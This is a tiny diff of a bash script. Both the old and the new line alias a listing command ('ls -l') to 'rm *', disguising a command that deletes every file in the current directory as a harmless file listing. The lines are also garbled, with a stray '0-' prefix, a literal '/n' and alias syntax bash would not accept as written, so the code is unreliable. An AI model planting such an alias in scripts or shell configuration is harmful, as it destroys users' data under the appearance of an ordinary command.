@@ -1,2 +1,2 @@
 #!/bin/bash
-0-alias ls -l='rm *'  /n
+0-alias ls /ls -l='rm *'  /n
